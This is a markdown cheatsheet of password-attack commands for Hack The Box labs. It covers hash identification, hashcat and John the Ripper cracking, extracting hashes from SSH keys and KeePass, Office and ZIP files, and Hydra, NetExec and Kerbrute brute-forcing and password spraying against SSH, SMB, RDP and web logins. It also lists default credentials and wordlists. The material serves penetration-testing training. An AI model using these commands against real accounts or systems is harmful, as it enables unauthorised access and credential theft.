# Password Attacks Cheatsheet

Cracking, spraying, and brute-forcing techniques for HTB.

## Hash Identification

```bash
# hashid
hashid '$2y$12$...'
hashid '5f4dcc3b5aa765d61d8327deb882cf99'

# hash-identifier
hash-identifier

# Common hash types:
# MD5:          32 hex chars           -> hashcat -m 0
# SHA1:         40 hex chars           -> hashcat -m 100
# SHA256:       64 hex chars           -> hashcat -m 1400
# SHA512:       128 hex chars          -> hashcat -m 1800
# NTLM:         32 hex chars           -> hashcat -m 1000
# NTLMv2:       user::domain:...       -> hashcat -m 5600
# bcrypt:       $2a$/$2b$/$2y$         -> hashcat -m 3200
# Kerberoast:   $krb5tgs$23$...        -> hashcat -m 13100
# AS-REP:       $krb5asrep$23$...      -> hashcat -m 18200
# sha512crypt:  $6$...                 -> hashcat -m 1800
# sha256crypt:  $5$...                 -> hashcat -m 7400
# md5crypt:     $1$...                 -> hashcat -m 500
# DES(crypt):   13 chars               -> hashcat -m 1500
# Apache MD5:   $apr1$...              -> hashcat -m 1600
```

## Hashcat

```bash
# Basic usage
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked
hashcat -m <mode> hash.txt --show

# Common modes
hashcat -m 0 md5.txt wordlist.txt                    # MD5
hashcat -m 1000 ntlm.txt wordlist.txt                # NTLM
hashcat -m 1800 sha512crypt.txt wordlist.txt          # sha512crypt ($6$)
hashcat -m 3200 bcrypt.txt wordlist.txt               # bcrypt
hashcat -m 5600 ntlmv2.txt wordlist.txt               # NTLMv2
hashcat -m 13100 kerberoast.txt wordlist.txt           # Kerberoast
hashcat -m 18200 asrep.txt wordlist.txt                # AS-REP Roast
hashcat -m 22000 wifi.hc22000 wordlist.txt             # WPA-PBKDF2-PMKID+EAPOL
hashcat -m 16500 jwt.txt wordlist.txt                  # JWT

# Brute force
hashcat -m 1000 ntlm.txt -a 3 ?u?l?l?l?l?d?d?d       # Uppercase + lowercase + digits
hashcat -m 1000 ntlm.txt -a 3 ?a?a?a?a?a?a             # All chars, 6 length

# Combinator
hashcat -m 0 hash.txt -a 1 words1.txt words2.txt
```

## John the Ripper

```bash
# Basic
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# With format
john hash.txt --wordlist=rockyou.txt --format=Raw-MD5
john hash.txt --wordlist=rockyou.txt --format=NT
john hash.txt --wordlist=rockyou.txt --format=bcrypt

# Show cracked
john hash.txt --show

# Conversion tools
ssh2john id_rsa > ssh_hash.txt
zip2john file.zip > zip_hash.txt
rar2john file.rar > rar_hash.txt
keepass2john database.kdbx > keepass_hash.txt
office2john document.docx > office_hash.txt
pdf2john file.pdf > pdf_hash.txt
pfx2john cert.pfx > pfx_hash.txt
```

## Online Password Brute Force

```bash
# Hydra - SSH
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.X -t 4

# Hydra - FTP
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.X

# Hydra - HTTP POST login
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.X http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Hydra - HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.X http-get /admin

# Hydra - SMB
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://10.10.10.X

# Hydra - RDP
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.X

# NetExec - SMB password spray
nxc smb 10.10.10.X -u users.txt -p passwords.txt --continue-on-success

# NetExec - WinRM
nxc winrm 10.10.10.X -u users.txt -p passwords.txt

# Kerbrute - Domain user spray
kerbrute passwordspray -d domain.htb --dc 10.10.10.X users.txt 'Password123!'

# Kerbrute - User enumeration
kerbrute userenum -d domain.htb --dc 10.10.10.X users.txt
```

## Wordlist Generation

```bash
# CeWL - Generate wordlist from website
cewl http://10.10.10.X -w wordlist.txt -d 3 -m 5

# Crunch - Pattern-based
crunch 8 8 -t @@@@%%%% -o wordlist.txt   # 4 lowercase + 4 digits

# Username generation
# username-anarchy
username-anarchy -i names.txt > usernames.txt

# Mutation rules
# hashcat rules: /usr/share/hashcat/rules/
# best64.rule, rockyou-30000.rule, d3ad0ne.rule

# Custom wordlist from target
# Combine: company name, city, year, season, common patterns
echo -e "Company2026\nCompany2025\nCompany!\nWinter2026\nSummer2025" > custom.txt
```

## Common Default Credentials

```
admin:admin
admin:password
admin:Password1
root:root
root:toor
administrator:administrator
guest:guest
tomcat:tomcat
tomcat:s3cret
postgres:postgres
sa:sa
```

## Useful Wordlists

```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/seclists/Passwords/Default-Credentials/
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Passwords/Leaked-Databases/
```
